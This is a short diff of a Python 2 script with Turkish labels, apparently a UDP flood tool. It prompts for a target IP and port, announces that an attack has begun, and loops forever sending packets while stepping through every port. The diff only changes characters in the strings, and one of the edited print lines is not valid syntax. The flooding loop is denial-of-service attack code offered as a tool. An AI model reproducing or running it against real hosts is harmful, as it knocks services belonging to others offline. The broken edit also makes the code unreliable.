@@ -30,7 +30,7 @@ ip = raw_input("Hedef IP : ")
 port = input("Port       : ")
 
 os.system("clear")
-os.system("figlet Saldırı Başlamıştır")
+os.system("figlet Saldiri Baslamistir")
 print "[                    ] 0% "
 time.sleep(5)
 print "[=====               ] 25%"
@@ -46,6 +46,6 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "%s paket %s e yollanmıştır port:%s"% ile(sent,ip,port)
+     print "%s paket %s e yollanmistir port:%s"%(sent,ip,port) ile
      if port == 65534:
        port = 1
